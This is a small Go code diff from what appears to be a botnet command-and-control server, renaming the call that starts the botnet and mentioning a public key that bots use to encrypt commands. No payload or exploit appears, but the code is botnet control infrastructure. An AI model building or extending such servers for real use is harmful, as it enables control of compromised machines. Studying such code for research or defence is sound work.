@@ -15,7 +15,7 @@ func NewCommandAndControlService() http.Handler {
 	if err != nil {
 		log.Fatalf("could not create new command and control: %s", err)
 	}
-	go cc.StartBotnet()
+	go cc.RunBotnet()
 
 	router := mux.NewRouter()
 	// exposes a public key for bots to encrypt commands before sending
